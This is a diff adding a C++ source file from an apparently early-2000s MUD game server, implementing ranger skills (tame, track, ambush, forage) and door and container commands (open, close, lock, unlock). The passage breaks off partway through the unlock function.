@@ -1,0 +1,1594 @@
+/************************************************************************
+| $Id: cl_ranger.cpp,v 1.1 2002/06/13 04:32:20 dcastle Exp $ | cl_ranger.C |
+Description: Ranger skills/spells */ extern "C"  {
+  #include <string.h>
+}
+#include <iostream.h>
+
+#include <character.h>
+#include <affect.h>
+#include <mobile.h>
+#include <utility.h>
+#include <spells.h>
+#include <isr.h>
+#include <handler.h>
+#include <room.h>
+#include <terminal.h>
+#include <player.h>
+#include <levels.h>
+#include <connect.h>
+#include <fight.h>
+#include <interp.h>
+#include <db.h>
+#include <act.h>
+#include <fileinfo.h> // SAVE_DIR
+#include <unistd.h>   // unlink()
+#include <returnvals.h>
+
+extern CWorld world;
+extern struct zone_data *zone_table;
+ 
+extern struct race_shit race_info[];
+extern int rev_dir[];
+extern struct index_data *obj_index;
+
+int saves_spell(CHAR_DATA *ch, CHAR_DATA *vict, int spell_base, sh_int save_type);
+bool any_charms(CHAR_DATA *ch);
+
+int do_tame(CHAR_DATA *ch, char *arg, int cmd)
+{
+  struct affected_type af;
+  CHAR_DATA *victim;
+  int percent;
+  byte learned;
+  char buf[200];
+
+  void add_follower(CHAR_DATA *ch, CHAR_DATA *leader, int cmd);
+  void stop_follower(CHAR_DATA *ch, int cmd);
+
+  while(*arg == ' ')
+    arg++;
+
+  if(!*arg) {
+    send_to_char("Who do you want to tame?\n\r", ch);
+    return eFAILURE;
+  }
+
+  if(IS_MOB(ch))
+    learned = 75;
+  else if(!(learned = has_skill(ch, SKILL_TAME))) {
+    send_to_char("Try learning HOW to tame first.\r\n", ch);
+    return eFAILURE;
+  }
+
+  one_argument(arg, buf);
+
+  if(!(victim = get_char_room_vis(ch, buf))) {
+    send_to_char("No one here by that name!\n\r", ch);
+    return eFAILURE;
+  }
+
+  if(victim == ch) {
+    send_to_char("Tame the wild beast!\n\r", ch);
+    return eFAILURE;
+  }
+
+  if(!IS_NPC(victim)) {
+    send_to_char("You find yourself unable to tame this player.\n\r", ch);
+    return eFAILURE;
+  }
+
+  if(IS_AFFECTED(victim, AFF_CHARM) || IS_AFFECTED(ch, AFF_CHARM) ||
+     (GET_LEVEL(ch) < GET_LEVEL(victim))) {
+    send_to_char("You find yourself unable to tame this creature.\n\r", ch);
+    return eFAILURE;
+  }
+
+  if(circle_follow(victim, ch)) {
+    send_to_char("Sorry, following in circles can not be allowed.\n\r", ch);
+    return eFAILURE;
+  }
+
+   if(any_charms(ch))  {
+     send_to_char("How you plan on controlling so many followers?\n\r", ch);
+     return eFAILURE;
+   }
+
+  act("$n holds out $s hand to $N and beckons softly.", ch, NULL, victim, TO_ROOM, INVIS_NULL); 
+
+  if((IS_SET(victim->immune, ISR_CHARM)) ||
+      !IS_SET(victim->mobdata->actflags, ACT_CHARM)) {
+    act("$N is wilder than you thought.", ch, NULL, victim, TO_CHAR, 0);
+    return eFAILURE;
+  }
+
+  percent = number(1,101);
+
+  if(percent > learned || saves_spell(ch, victim, 0, SAVE_TYPE_MAGIC) >= 0) {
+    act("$N is unreceptive to your attempts to tame $m.", ch, NULL, 
+        victim, TO_CHAR, 0);
+    return eFAILURE;
+  }
+
+  if(victim->master)
+    stop_follower(victim, 0);
+
+  add_follower(victim, ch, 0);
+
+  af.type      = SPELL_CHARM_PERSON;
+
+  if(GET_INT(victim))
+    af.duration  = 24*18/GET_INT(victim);
+  else
+    af.duration  = 24*18;
+
+  af.modifier  = 0;
+  af.location  = 0;
+  af.bitvector = AFF_CHARM;
+  affect_to_char(victim, &af);
+
+  act("Isn't $n just such a nice person?", ch , 0, victim, TO_VICT, 0);
+  return eSUCCESS;
+}
+
+int do_track(CHAR_DATA *ch, char *argument, int cmd)
+{
+  int x,y;
+  int retval;
+  char buf[300];
+  int  how_deep = ((has_skill(ch, SKILL_TRACK) / 10) + 1);
+  char race[40];
+  char sex[20];
+  char condition[60];
+  char weight[40];
+  char victim[MAX_INPUT_LENGTH];
+  CHAR_DATA *quarry;
+  CHAR_DATA *tmp_ch;  // For checking room stuff
+  room_track_data * pScent = 0;
+  void swap_hate_memory(char_data * ch);
+  extern char *dirs[];
+
+  one_argument(argument, victim);
+
+  quarry = get_char_room_vis(ch, victim);
+ 
+  if(ch->hunting) {
+    if(get_char_room_vis(ch, ch->hunting) ) {
+      ansi_color( RED, ch);
+      ansi_color( BOLD, ch);
+      send_to_char("You have found your target!\n\r", ch);
+      ansi_color( NTEXT, ch);
+
+      remove_memory(ch, 't');
+      return eSUCCESS;
+    } 
+  }
+  
+  else if(quarry) {
+    send_to_char("There's one right here ;)\n\r", ch);
+    remove_memory(ch, 't');
+    return eSUCCESS;
+  }
+
+  if(*victim && !IS_NPC(ch) && GET_CLASS(ch) != CLASS_RANGER
+     && GET_CLASS(ch) != CLASS_DRUID && GET_LEVEL(ch) < ANGEL) {
+    send_to_char("Only a ranger or a druid could track someone by name.\n\r",
+                 ch);
+    return eFAILURE;
+  }
+
+  act("$n walks about slowly, searching for signs of $s quarry", ch, 0, 0,
+      TO_ROOM, INVIS_NULL);
+  send_to_char("You sniff the air...\n\r\n\r", ch);
+
+  if(IS_MOB(ch) && IS_SET(ch->mobdata->actflags, ACT_STUPID)) {
+    send_to_char("Being stupid, you cannot find any..\r\n", ch);
+    return eFAILURE;
+  }
+
+  if(world[ch->in_room].nTracks < 1) {
+    if(ch->hunting) {
+      ansi_color( RED, ch);
+      ansi_color( BOLD, ch);
+      send_to_char("You have lost the trail.\n\r", ch);
+      ansi_color( NTEXT, ch);
+      remove_memory(ch, 't');
+    }
+    else
+      send_to_char("There are no distinct scents here.\n\r",ch);
+    return eFAILURE;
+  }
+
+  if(IS_NPC(ch))
+    how_deep = 10;
+
+  if (*victim) { 
+    for(x = 1; x <= how_deep; x++) {
+        
+      if ( (x > world[ch->in_room].nTracks) ||
+          !(pScent = world[ch->in_room].TrackItem(x))) {
+         if (ch->hunting) {
+            ansi_color( RED, ch);
+            ansi_color( BOLD, ch);
+            send_to_char("You have lost the trail.\n\r", ch);
+            ansi_color( NTEXT, ch);
+            }
+         else
+            send_to_char("You can't find any traces of such a scent.\n\r",ch);
+         remove_memory(ch, 't');
+         if(IS_NPC(ch))
+           swap_hate_memory(ch);
+         return eFAILURE;
+         }
+
+      
+      if (isname(victim, pScent->trackee)) {
+          y = pScent->direction;
+          add_memory(ch, pScent->trackee, 't'); 
+          ansi_color( RED, ch );
+          ansi_color( BOLD, ch);
+          csendf(ch, "You sense traces of your quarry to the %s.\n\r",
+                  dirs[y]);
+          ansi_color( NTEXT, ch); 
+
+          if (IS_NPC(ch)) {
+             if ( (!IS_SET(ch->mobdata->actflags, ACT_STAY_NO_TOWN) ||
+	           !IS_SET(zone_table[world[EXIT(ch, y)->to_room].zone].zone_flags, ZONE_IS_TOWN)
+                  ) 
+                 && !IS_SET(world[EXIT(ch, y)->to_room].room_flags,NO_TRACK)) 
+             {
+                 ch->mobdata->last_direction = y;
+	         retval = do_move(ch, "", (y+1));
+                 if(IS_SET(retval, eCH_DIED))
+                   return retval;
+             }
+
+              if (!ch->hunting)
+                 return eFAILURE; 
+
+	      // Here's the deal: if the mob can't see the character in
+	      // the room, but the character IS in the room, then the
+	      // mob can't see the character and we need to stop tracking.
+	      // It does, however, leave the mob open to be taken apart
+	      // by, say, a thief.  I'll let he who wrote it fix that.
+	      // Morc 28 July 96
+
+              if (!(get_char_room_vis(ch, ch->hunting))) {
+	         if ((tmp_ch = get_char(ch->hunting)) == 0)
+		    return eFAILURE;
+                 if (tmp_ch->in_room == ch->in_room) {
+		    // The mob can't see him
+                    act("$n says 'Damn, must have lost $m!'", ch, 0, 0,
+		        TO_ROOM, 0);
+                    remove_memory(ch, 't');
+	            }
+                 return eFAILURE; 
+	         }
+
+              if (!IS_SET(world[ch->in_room].room_flags, SAFE))  {
+                 act("$n screams 'YOU CAN RUN, BUT YOU CAN'T HIDE!'",
+                     ch, 0, 0, TO_ROOM, 0);
+                 return do_hit(ch, ch->hunting, 0);
+                 }
+              else 
+                 act("$n says 'You can't stay here forever.'",
+                     ch, 0, 0, TO_ROOM, 0);
+              } // if IS_NPC
+	 
+           return eSUCCESS;
+           } // if isname
+        } // for
+	
+     if (ch->hunting) {
+        ansi_color( RED, ch);
+        ansi_color( BOLD, ch);
+        send_to_char("You have lost the trail.\n\r", ch);
+        ansi_color( NTEXT, ch);
+        }
+    else 
+       send_to_char("You can't find any traces of such a scent.\n\r", ch);
+    
+    remove_memory(ch, 't');
+    return eFAILURE; 
+    } // if *victim
+
+
+  how_deep = MAX(5, how_deep);
+ 
+  for(x = 1; x <= how_deep; x++) {
+
+     if ( (x > world[ch->in_room].nTracks) ||
+         !(pScent = world[ch->in_room].TrackItem(x))) {
+        if (x == 1)
+           send_to_char("There are no distinct smells here.\n\r", ch);
+        break;
+        }
+        
+     y = pScent->direction;
+
+     if (pScent->weight < 50)
+        strcpy(weight," small,");
+     else if(pScent->weight <= 201)
+        strcpy(weight," medium-sized,");
+     else if(pScent->weight < 350)
+        strcpy(weight," big,");
+     else if(pScent->weight < 500)
+        strcpy(weight," large,");
+     else if(pScent->weight < 800)
+        strcpy(weight," huge,");
+     else if(pScent->weight < 1500)
+        strcpy(weight," very large,");
+     else
+        strcpy(weight," gigantic,");
+
+     if (pScent->condition < 10)
+        strcpy(condition," severely injured,");
+     else if(pScent->condition < 25)
+        strcpy(condition," badly wounded,");
+     else if(pScent->condition < 40)
+        strcpy(condition," injured,");
+     else if(pScent->condition < 60)
+        strcpy(condition," wounded,");
+     else if(pScent->condition < 80)
+        strcpy(condition," slightly injured,");
+     else
+        strcpy(condition," healthy,");
+
+     if (pScent->sex == 1)
+        strcpy(sex," male");
+     else if (pScent->sex == 2)
+        strcpy (sex," female");
+     else
+        strcpy(sex,""); 
+
+     if (pScent->race >=1 && pScent->race <= 30) 
+        sprintf(race, " %s", race_info[pScent->race].singular_name);
+     else
+        strcpy(race," of a nondescript race");
+
+    if (number(1, 101) >= (how_deep * 10))
+       strcpy(weight,"");
+    if (number(1, 101) >= (how_deep * 10))
+       strcpy(race," of a nondescript race");
+    if (number(1, 101) >= (how_deep * 10))
+       strcpy(condition,"");
+    if (number(1, 101) >= (how_deep * 10))
+       strcpy(sex,"");
+
+    if (x == 1)
+       send_to_char("Freshest scents first...\n\r", ch);
+ 
+    sprintf(buf,"The scent of a%s%s%s%s leads %s.\n\r",
+            weight,
+            condition,
+            sex,
+            race,
+            dirs[y]);
+    send_to_char(buf, ch);
+  }
+  return eSUCCESS;
+}
+
+int ambush(CHAR_DATA *ch)
+{
+  CHAR_DATA *i, *next_i;
+  int retval;
+  byte learned;
+
+  if(IS_MOB(ch))
+    learned = 75;
+  else if(!(learned = has_skill(ch, SKILL_AMBUSH))) {
+    return eFAILURE;
+  }
+
+  for(i = world[ch->in_room].people; i; i = next_i) {
+  
+     next_i = i->next_in_room;
+  
+     if(i == ch || !i->ambush || !CAN_SEE(i, ch))
+       continue;
+     if(!IS_NPC(i) && GET_CLASS(i) != CLASS_RANGER)
+       continue;
+     if(GET_POS(i) < POSITION_RESTING || GET_POS(i) == POSITION_FIGHTING ||
+        (IS_SET(world[i->in_room].room_flags, SAFE) &&
+	 !IS_AFFECTED(ch, AFF_CANTQUIT)))
+       continue;
+     if(isname(i->ambush, GET_NAME(ch)) &&
+        number(1, 101) <= learned || IS_NPC(i)) { 
+       act("$n ambushes $N in a brilliant surprise attack!",
+           i, 0, ch, TO_ROOM, NOTVICT);
+       act("$n ambushes you as you enter the room!",
+           i, 0, ch, TO_VICT, 0);
+       act("You ambush $N with a brilliant surprise attack!",
+           i, 0, ch, TO_CHAR, 0);
+       WAIT_STATE(i, PULSE_VIOLENCE * 2);
+       WAIT_STATE(ch, PULSE_VIOLENCE * 2);
+       retval = damage(i, ch, GET_LEVEL(i) * 10, TYPE_UNDEFINED, TYPE_UNDEFINED, 0); 
+       if(IS_SET(retval, eVICT_DIED))
+         return eSUCCESS|eCH_DIED;  // ch = damage vict
+
+       continue;
+//  we continue instead of breaking in case there are any OTHER rangers in the room
+//       break;
+     }
+  }
+  return eSUCCESS;
+}
+
+int do_ambush(CHAR_DATA *ch, char *arg, int cmd)
+{
+  char buf[200];
+
+  if(GET_CLASS(ch) != CLASS_RANGER) {
+    send_to_char("You aren't a ranger!\n\r", ch);
+    return eFAILURE;
+  }
+
+  while(*arg == ' ')
+    arg++;
+
+  if(!*arg) { 
+    sprintf(buf, "You will ambush %s on sight.\n\r", ch->ambush ?
+            ch->ambush : "no one");
+    send_to_char(buf, ch);
+    return eSUCCESS;
+  }
+
+  if(!(ch->ambush)) {
+    sprintf(buf, "You will now ambush %s on sight.\n\r", arg);
+    send_to_char(buf, ch);
+    ch->ambush = str_dup(arg);
+    return eSUCCESS;
+  } 
+
+  if(!str_cmp(arg, ch->ambush)) {
+    sprintf(buf, "You will no longer ambush %s on sight.\n\r", arg);
+    send_to_char(buf, ch);
+    dc_free(ch->ambush);
+    return eSUCCESS;
+  }
+
+  dc_free(ch->ambush);
+  do_ambush(ch, arg, 9); 
+  return eSUCCESS;
+}
+
+/*
+SECT_INSIDE           0
+SECT_CITY             1
+SECT_FIELD            2
+SECT_FOREST           3
+SECT_HILLS            4
+SECT_MOUNTAIN         5
+SECT_WATER_SWIM       6
+SECT_WATER_NOSWIM     7
+SECT_NO_LOW           8
+SECT_NO_HIGH          9
+SECT_DESERT          10
+*/
+
+int pick_one(int a, int b)
+{
+  return number(1, 100) <= 50 ? a : b;
+}
+
+int pick_one(int a, int b, int c)
+{
+  int x = number(1, 100);
+  
+  if(x > 66)
+    return a;
+  else if(x > 33)
+    return b;
+  else
+    return c;
+}
+
+int pick_one(int a, int b, int c, int d)
+{
+  int x = number(1, 100);
+  
+  if(x > 75)
+    return a;
+  else if(x > 50)
+    return b;
+  else if(x > 25)
+    return c;
+  else
+    return d;
+}
+
+int do_forage(CHAR_DATA *ch, char *arg, int cmd)
+{
+  int foraged;
+  int forage_cost;
+  struct obj_data * new_obj = 0;
+  byte learned;
+
+  int check_command_lag(CHAR_DATA * ch);
+  void add_command_lag(CHAR_DATA * ch, int amount);
+
+  forage_cost = GET_MAX_MOVE(ch) / 35;
+  if(GET_MOVE(ch) < forage_cost) {
+    send_to_char("You are too tired to be foraging around right now.\n\r", ch);
+    return eFAILURE;
+  }
+  
+  if(check_command_lag(ch))
+  {
+    send_to_char("You should wait a little while before you try to forage again.  Give mother nature time to copulate.\r\n", ch);
+    return eFAILURE;
+  }
+
+  if ((1+IS_CARRYING_N(ch)) > CAN_CARRY_N(ch)) {
+    send_to_char("You can't carry that many items!\r\n", ch);
+    return eFAILURE;
+  }
+
+  GET_MOVE(ch) -= forage_cost;
+ 
+  if(GET_CLASS(ch) == CLASS_RANGER) 
+    foraged = number(1,
+            (learned + (GET_LEVEL(ch)*2)) / 2 );
+  else
+    foraged = number(1, learned);
+
+  switch(world[ch->in_room].sector_type) {
+  case SECT_FIELD:
+    if(foraged > 85)
+      new_obj = clone_object( real_object( pick_one(3180, 3181) ) );
+    else if(foraged > 65)
+      new_obj = clone_object( real_object( pick_one(3178, 3179) ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(3175, 3176, 3177) ) );
+    break;    
+  case SECT_FOREST:
+    if(foraged > 85)
+      new_obj = clone_object( real_object( pick_one(3174, 3184) ) );
+    else if(foraged > 65)
+      new_obj = clone_object( real_object( pick_one(3172, 3173) ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(3169, 3170, 3171) ) );
+    break;    
+  case SECT_WATER_SWIM:
+    if(foraged > 85)
+      new_obj = clone_object( real_object( 3164 ) );
+    else if(foraged > 65)
+      new_obj = clone_object( real_object( 3163 ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(3160, 3161, 3162) ) );
+    break;    
+  case SECT_HILLS:
+    if(foraged > 95)
+      new_obj = clone_object( real_object( 2053 ) );
+    else if(foraged > 80)
+      new_obj = clone_object( real_object( pick_one(2066, 2067, 2054) ) );
+    else if(foraged > 65)
+      new_obj = clone_object( real_object( pick_one(2068, 2056, 2055) ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(2050, 2051, 2052) ) );
+    break;
+  case SECT_MOUNTAIN:
+    if(foraged > 70)
+      new_obj = clone_object( real_object( 3168 ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(3165, 3166, 3167) ) );
+    break;    
+  case SECT_BEACH:
+    if(foraged > 80)
+      new_obj = clone_object( real_object( pick_one(2060, 2061, 2062) ) );
+    else if(foraged > 65)
+      new_obj = clone_object( real_object( pick_one(2063, 2064, 2065) ) );
+    else if(foraged > 15)
+      new_obj = clone_object( real_object( pick_one(2057, 2058, 2059) ) );
+    break;
+  }
+
+  add_command_lag(ch, 1);
+
+  if(!new_obj) {
+    act("$n forages around for some food, but turns up nothing.", ch,
+        0, 0, TO_ROOM, 0);
+    act("You forage around for some food, but turn up nothing.", ch,
+        0, 0, TO_CHAR, 0);
+    return eFAILURE;
+  }
+  
+  act("$n forages around, turning up $p.", ch, new_obj, 0, TO_ROOM, 0);
+  act("You forage around, turning up $p.", ch, new_obj, 0, TO_CHAR, 0);
+  obj_to_char(new_obj, ch);
+  new_obj->obj_flags.timer = 4;
+  return eSUCCESS;
+}
+
+int find_door(CHAR_DATA *ch, char *type, char *dir)
+{
+    char buf[MAX_STRING_LENGTH];
+    int door;
+    char *dirs[] = 
+    {
+	"north",
+	"east",
+	"south",
+	"west",
+	"up",
+	"down",
+	"\n"
+    };
+
+    if (*dir) /* a direction was specified */
+    {
+	if ((door = search_block(dir, dirs, FALSE)) == -1) /* Partial Match */
+	{
+	    send_to_char("That's not a direction.\n\r", ch);
+	    return(-1);
+	}
+
+	if (EXIT(ch, door))
+	    if (EXIT(ch, door)->keyword)
+		if (isname(type, EXIT(ch, door)->keyword))
+		    return(door);
+		else
+		{
+		    sprintf(buf, "There is no %s there.\n\r", type);
+		    send_to_char(buf, ch);
+		    return(-1);
+		}
+	    else
+		return(door);
+	else
+	{
+	    sprintf(buf, "There is no %s there.\n\r", type);
+	    send_to_char(buf, ch);
+	    return(-1);
+	}
+    }
+    else // try to locate the keyword
+    {
+	for (door = 0; door <= 5; door++)
+	    if (EXIT(ch, door))
+		if (EXIT(ch, door)->keyword)
+		    if (isname(type, EXIT(ch, door)->keyword))
+			return(door);
+
+	sprintf(buf, "I see no %s here.\n\r", type);
+	send_to_char(buf, ch);
+	return(-1);
+    }
+}
+
+int do_open(CHAR_DATA *ch, char *argument, int cmd)
+{
+    int door, other_room;
+    char type[MAX_INPUT_LENGTH], dir[MAX_INPUT_LENGTH], buf[MAX_STRING_LENGTH];
+    struct room_direction_data *back;
+    struct obj_data *obj;
+    CHAR_DATA *victim;
+
+    argument_interpreter(argument, type, dir);
+
+    if (!*type)
+	send_to_char("Open what?\n\r", ch);
+    else if (generic_find(argument, FIND_OBJ_INV | FIND_OBJ_ROOM,
+	ch, &victim, &obj))
+
+	// this is an object
+
+	if (obj->obj_flags.type_flag != ITEM_CONTAINER)
+	    send_to_char("That's not a container.\n\r", ch);
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_CLOSED))
+	    send_to_char("But it's already open!\n\r", ch);
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_CLOSEABLE))
+	    send_to_char("You can't do that.\n\r", ch);
+	else if (IS_SET(obj->obj_flags.value[1], CONT_LOCKED))
+	    send_to_char("It seems to be locked.\n\r", ch);
+	else
+	{
+	    REMOVE_BIT(obj->obj_flags.value[1], CONT_CLOSED);
+	    send_to_char("Ok.\n\r", ch);
+	    act("$n opens $p.", ch, obj, 0, TO_ROOM, 0);
+	}
+    else if ((door = find_door(ch, type, dir)) >= 0)
+
+	/* perhaps it is a door */
+
+	if (!IS_SET(EXIT(ch, door)->exit_info, EX_ISDOOR))
+	    send_to_char("That's impossible, I'm afraid.\n\r", ch);
+	else if (!IS_SET(EXIT(ch, door)->exit_info, EX_CLOSED))
+	    send_to_char("It's already open!\n\r", ch);
+	else if (IS_SET(EXIT(ch, door)->exit_info, EX_LOCKED))
+	    send_to_char("It seems to be locked.\n\r", ch);
+	else if (IS_SET(EXIT(ch, door)->exit_info, EX_IMM_ONLY) && GET_LEVEL(ch) < IMMORTAL)
+	    send_to_char("It seems to slither and resist your attempt to touch it.\n\r", ch);
+	else
+	{
+	    REMOVE_BIT(EXIT(ch, door)->exit_info, EX_CLOSED);
+	    
+	    if(IS_SET(EXIT(ch, door)->exit_info, EX_HIDDEN)) {
+	      if (EXIT(ch, door)->keyword) {
+	        act("$n reveals a hidden $F!", ch, 0, EXIT(ch, door)->keyword,
+		    TO_ROOM, 0);
+	        csendf(ch, "You reveal a hidden %s!\n\r",
+	              fname((char *)EXIT(ch, door)->keyword));
+	      }
+	      else {
+	        act("$n reveals a hidden door!",ch, 0, EXIT(ch, door)->keyword,
+		    TO_ROOM, 0);
+	        send_to_char("You reveal a hidden door!\n\r", ch);
+	      }
+	    }
+	    else {
+	      if (EXIT(ch, door)->keyword)
+		  act("$n opens the $F.", ch, 0, EXIT(ch, door)->keyword,
+		      TO_ROOM, 0);
+	      else
+                act("$n opens the door.", ch, 0, 0, TO_ROOM, 0);
+	      send_to_char("Ok.\n\r", ch);
+	    }
+	    
+	    /* now for opening the OTHER side of the door! */
+	    if ((other_room = EXIT(ch, door)->to_room) != NOWHERE)
+	    if ( ( back = world[other_room].dir_option[rev_dir[door]] ) != 0 ) 
+		    if (back->to_room == ch->in_room)
+		    {
+			REMOVE_BIT(back->exit_info, EX_CLOSED);
+			if ((back->keyword) &&
+                  !IS_SET(world[EXIT(ch, door)->to_room].room_flags, QUIET))
+			{                    
+
+			    sprintf(buf,
+				"The %s is opened from the other side.\n\r",
+				fname(back->keyword));
+			    send_to_room(buf, EXIT(ch, door)->to_room);
+			}
+			else
+			    send_to_room(
+			    "The door is opened from the other side.\n\r",
+			    EXIT(ch, door)->to_room);
+		    }                        
+	}
+  return eSUCCESS;
+}
+
+
+int do_close(CHAR_DATA *ch, char *argument, int cmd)
+{
+    int door, other_room;
+    char type[MAX_INPUT_LENGTH], dir[MAX_INPUT_LENGTH], buf[MAX_STRING_LENGTH];
+    struct room_direction_data *back;
+    struct obj_data *obj;
+    CHAR_DATA *victim;
+
+    argument_interpreter(argument, type, dir);
+
+    if (!*type)
+	send_to_char("Close what?\n\r", ch);
+    else if (generic_find(argument, FIND_OBJ_INV | FIND_OBJ_ROOM,
+	ch, &victim, &obj))
+
+	/* ths is an object */
+
+	if (obj->obj_flags.type_flag != ITEM_CONTAINER)
+	    send_to_char("That's not a container.\n\r", ch);
+	else if (IS_SET(obj->obj_flags.value[1], CONT_CLOSED))
+	    send_to_char("But it's already closed!\n\r", ch);
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_CLOSEABLE))
+	    send_to_char("That's impossible.\n\r", ch);
+	else
+	{
+	    SET_BIT(obj->obj_flags.value[1], CONT_CLOSED);
+	    send_to_char("Ok.\n\r", ch);
+	    act("$n closes $p.", ch, obj, 0, TO_ROOM, 0);
+	}
+    else if ((door = find_door(ch, type, dir)) >= 0)
+
+	/* Or a door */
+
+	if (!IS_SET(EXIT(ch, door)->exit_info, EX_ISDOOR))
+	    send_to_char("That's absurd.\n\r", ch);
+	else if (IS_SET(EXIT(ch, door)->exit_info, EX_CLOSED))
+	    send_to_char("It's already closed!\n\r", ch);
+	else
+	{
+	    SET_BIT(EXIT(ch, door)->exit_info, EX_CLOSED);
+	    if (EXIT(ch, door)->keyword)
+		act("$n closes the $F.", ch, 0, EXIT(ch, door)->keyword,
+		    TO_ROOM, 0);
+	    else
+		act("$n closes the door.", ch, 0, 0, TO_ROOM, 0);
+	    send_to_char("Ok.\n\r", ch);
+	    /* now for closing the other side, too */
+	    if ((other_room = EXIT(ch, door)->to_room) != NOWHERE)
+	    if ( ( back = world[other_room].dir_option[rev_dir[door]] ) != 0 )
+		    if (back->to_room == ch->in_room)
+		    {
+			SET_BIT(back->exit_info, EX_CLOSED);
+			if ((back->keyword) && 
+                   !IS_SET(world[EXIT(ch, door)->to_room].room_flags, QUIET))
+                        {
+			   sprintf(buf, "The %s closes quietly.\n\r",
+			           fname(back->keyword));
+			   send_to_room(buf, EXIT(ch, door)->to_room);
+			}
+			else
+			  send_to_room("The door closes quietly.\n\r",
+				       EXIT(ch, door)->to_room);
+		    }                        
+	}
+  return eSUCCESS;
+}
+
+
+int has_key(CHAR_DATA *ch, int key)
+{
+    struct obj_data *o;
+
+    if (ch->equipment[HOLD]) {
+	if (obj_index[ch->equipment[HOLD]->item_number].virt == key)
+	    return(1);
+        // This item is the 'enchanted box' contest prize (master key)
+	if (obj_index[ch->equipment[HOLD]->item_number].virt == 458)
+	    return(1);
+    }
+
+    for (o = ch->carrying; o; o = o->next_content)
+	if (obj_index[o->item_number].virt == key)
+	    return(1);
+
+    return(0);
+}
+
+
+int do_lock(CHAR_DATA *ch, char *argument, int cmd)
+{
+    int door, other_room;
+    char type[MAX_INPUT_LENGTH], dir[MAX_INPUT_LENGTH];
+    struct room_direction_data *back;
+    struct obj_data *obj;
+    CHAR_DATA *victim;
+
+    argument_interpreter(argument, type, dir);
+
+    if (!*type)
+	send_to_char("Lock what?\n\r", ch);
+    else if (generic_find(argument, FIND_OBJ_INV | FIND_OBJ_ROOM,
+	ch, &victim, &obj))
+
+	/* ths is an object */
+
+	if (obj->obj_flags.type_flag != ITEM_CONTAINER)
+	    send_to_char("That's not a container.\n\r", ch);
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_CLOSED))
+	    send_to_char("Maybe you should close it first...\n\r", ch);
+	else if (obj->obj_flags.value[2] < 0)
+	    send_to_char("That thing can't be locked.\n\r", ch);
+	else if (!has_key(ch, obj->obj_flags.value[2]))
+	    send_to_char("You don't seem to have the proper key.\n\r", ch); 
+	else if (IS_SET(obj->obj_flags.value[1], CONT_LOCKED))
+	    send_to_char("It is locked already.\n\r", ch);
+	else
+	{
+	    SET_BIT(obj->obj_flags.value[1], CONT_LOCKED);
+	    send_to_char("*Cluck*\n\r", ch);
+	    act("$n locks $p - 'cluck', it says.", ch, obj, 0, TO_ROOM, 0);
+	}
+    else if ((door = find_door(ch, type, dir)) >= 0)
+
+	/* a door, perhaps */
+
+	if (!IS_SET(EXIT(ch, door)->exit_info, EX_ISDOOR))
+	    send_to_char("That's absurd.\n\r", ch);
+	else if (!IS_SET(EXIT(ch, door)->exit_info, EX_CLOSED))
+	    send_to_char("You have to close it first, I'm afraid.\n\r", ch);
+	else if (EXIT(ch, door)->key < 0)
+	    send_to_char("There does not seem to be any keyholes.\n\r", ch);
+	else if (!has_key(ch, EXIT(ch, door)->key))
+	    send_to_char("You don't have the proper key.\n\r", ch);
+	else if (IS_SET(EXIT(ch, door)->exit_info, EX_LOCKED))
+	    send_to_char("It's already locked!\n\r", ch);
+	else
+	{
+	    SET_BIT(EXIT(ch, door)->exit_info, EX_LOCKED);
+	    if (EXIT(ch, door)->keyword)
+		act("$n locks the $F.", ch, 0,  EXIT(ch, door)->keyword,
+		    TO_ROOM, 0);
+	    else
+		act("$n locks the door.", ch, 0, 0, TO_ROOM, 0);
+	    send_to_char("*Click*\n\r", ch);
+	    /* now for locking the other side, too */
+	    if ((other_room = EXIT(ch, door)->to_room) != NOWHERE)
+	    if ( ( back = world[other_room].dir_option[rev_dir[door]] ) != 0 )
+		    if (back->to_room == ch->in_room)
+			SET_BIT(back->exit_info, EX_LOCKED);
+	}
+  return eSUCCESS;
+}
+
+
+int do_unlock(CHAR_DATA *ch, char *argument, int cmd)
+{
+    int door, other_room;
+    char type[MAX_INPUT_LENGTH], dir[MAX_INPUT_LENGTH];
+    struct room_direction_data *back;
+    struct obj_data *obj;
+    CHAR_DATA *victim;
+
+    argument_interpreter(argument, type, dir);
+
+    if (!*type)
+	send_to_char("Unlock what?\n\r", ch);
+    else if (generic_find(argument, FIND_OBJ_INV | FIND_OBJ_ROOM,
+	ch, &victim, &obj))
+
+	/* ths is an object */
+
+	if (obj->obj_flags.type_flag != ITEM_CONTAINER)
+	    send_to_char("That's not a container.\n\r", ch);
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_CLOSED))
+	    send_to_char("Silly - it ain't even closed!\n\r", ch);
+	else if (obj->obj_flags.value[2] < 0)
+	    send_to_char("Odd - you can't seem to find a keyhole.\n\r", ch);
+	else if (!has_key(ch, obj->obj_flags.value[2]))
+	    send_to_char("You don't seem to have the proper key.\n\r", ch); 
+	else if (!IS_SET(obj->obj_flags.value[1], CONT_LOCKED))
+	    send_to_char("Oh.. it wasn't locked, after all.\n\r", ch);
+	else
+	{
+	    REMOVE_BIT(obj->obj_flags.value[1], CONT_LOCKED);
+	    send_to_char("*Click*\n\r", ch);
+	    act("$n unlocks $p.", ch, obj, 0, TO_ROOM, 0);
+	}
+    else if ((door = find_door(ch, type, dir)) >= 0)
+
+	/* it is a door */
+
+	if (!IS_SET(EXIT(ch, door)->exit_info, EX_ISDOOR))
+	    send_to_char("That's absurd.\n\r", ch);
+	else if (!IS_SET(EXIT(ch, door)->exit_info, EX_CLOSED))
+	    send_to_char("Heck ... it ain't even closed!\n\r", ch);
+	else if (EXIT(ch, door)->key < 0)
+	    send_to_char("You can't seem to spot any keyholes.\n\r", ch);
+	else if (!has_key(ch, EXIT(ch, door)->key))
+	    send_to_char("You do not have the proper key for that.\n\r", ch);
+	else if (!IS_SET(EXIT(ch, door)->exit_info, EX_LOCKED))
+	    send_to_char("It's already unlocked, it seems.\n\r", ch);
+	else
+	{
+	    REMOVE_BIT(EXIT(ch, door)->exit_info, EX_LOCKED);
+	    if (EXIT(ch, door)->keyword)
